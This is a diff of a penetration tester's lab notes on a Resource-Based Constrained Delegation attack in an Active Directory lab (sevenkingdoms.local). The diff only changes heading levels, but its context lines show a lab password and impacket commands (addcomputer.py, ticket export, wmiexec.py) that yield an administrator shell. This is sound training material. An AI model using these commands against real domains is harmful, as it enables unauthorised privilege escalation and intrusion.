@@ -4,11 +4,11 @@ If a user has GenericAll/GenericWrite over a host, RBCD is possible.
 
 ![[Pasted image 20241109135409.png]]
 
-### User
+#### User
 
 - stannis.baratheon@sevenkingdoms.local:Drag0nst0ne
 
-### The Attack
+#### The Attack
 
 First, we need to add a computer account:
 
@@ -65,7 +65,7 @@ C:\>whoami
 sevenkingdoms\administrator
 ```
 
-### Summary
+#### Summary
 
 ```bash
 addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip <dc_ip> '<domain>/<user>:<password>
@@ -75,7 +75,7 @@ export KRB5CCNAME=<target_user>.ccache
 wmiexec.py -k -no-pass <target_computer>.<domain>
 ```
 
-### From Windows
+#### From Windows
 
 ```bash
 Import-Module .\powermad.ps1
